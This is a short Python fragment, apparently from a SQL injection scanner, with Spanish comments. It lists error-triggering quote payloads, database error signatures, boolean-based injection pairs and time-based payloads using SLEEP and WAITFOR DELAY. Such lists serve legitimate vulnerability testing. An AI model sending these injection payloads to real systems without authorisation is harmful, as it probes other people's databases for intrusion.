# Payloads y firmas
ERROR_PAYLOADS = [
    "'", '"', "''", "`", "\\", "1'", "1\"",
]

SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate", "syntax error", "ora-", "pg::syntaxerror",
    "microsoft ole db", "odbc sql server driver",
]

BOOLEAN_PAYLOADS = [
    ("1 AND 1=1", "1 AND 1=2"),
    ("1' AND '1'='1", "1' AND '1'='2"),
]

TIME_PAYLOADS = [
    "1; SELECT SLEEP(4)-- -",
    "1' AND SLEEP(4)-- -",
    "1; WAITFOR DELAY '0:0:4'-- -",
]
TIME_THRESHOLD = 3.5
